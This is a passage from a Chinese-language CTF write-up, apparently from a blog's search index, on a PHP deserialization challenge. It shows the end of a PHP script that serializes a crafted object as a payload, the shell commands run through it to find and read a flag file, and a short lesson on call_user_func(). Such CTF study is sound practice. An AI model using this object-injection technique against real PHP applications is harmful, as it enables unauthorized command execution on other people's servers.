<span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
<h1 id="总结">总结</h1>
<p>本题难度并不大，主要的难点就在于报错提示的
<code>call_user_func()</code>
，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在
<strong>命令执行</strong> 相关题目中积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
